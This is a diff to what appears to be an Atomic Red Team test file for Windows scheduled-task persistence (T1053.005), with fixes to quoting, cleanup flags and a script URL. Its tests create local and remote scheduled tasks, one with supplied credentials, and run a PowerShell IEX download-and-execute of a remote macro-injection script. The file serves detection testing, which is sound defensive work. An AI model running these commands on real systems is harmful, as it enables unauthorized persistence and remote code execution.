@@ -22,7 +22,6 @@ atomic_tests:
   auto_generated_guid: 42f53695-ad4a-4546-abb6-7d837f644a71
   description: |
     Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.
-
   supported_platforms:
     - windows
   input_arguments:
@@ -33,7 +32,7 @@ atomic_tests:
     time:
       description: What time 24 Hour
       type: String
-      default: 20:10
+      default: "20:10"
   executor:
     name: command_prompt
     elevation_required: false
@@ -41,7 +40,6 @@ atomic_tests:
       SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
     cleanup_command: |
       SCHTASKS /Delete /TN spawn /F >nul 2>&1
-
 - name: Scheduled task Remote
   auto_generated_guid: 2e5eac3e-327b-4a88-a0c0-c4057039a8dd
   description: |
@@ -58,7 +56,7 @@ atomic_tests:
     time:
       description: What time 24 Hour
       type: String
-      default: 20:10
+      default: "20:10"
     target:
       description: Target
       type: String
@@ -77,15 +75,13 @@ atomic_tests:
     command: |
       SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
     cleanup_command: |
-      SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /F >nul 2>&1
-
+      SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN "Atomic task" /F >nul 2>&1
 - name: Powershell Cmdlet Scheduled Task
   auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
   description: |
     Create an atomic scheduled task that leverages native powershell cmdlets.
 
     Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.
-
   supported_platforms:
     - windows
   executor:
@@ -127,7 +123,8 @@ atomic_tests:
       Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing) 
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
       Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
     name: powershell
 - name: WMI Invoke-CimMethod Scheduled Task
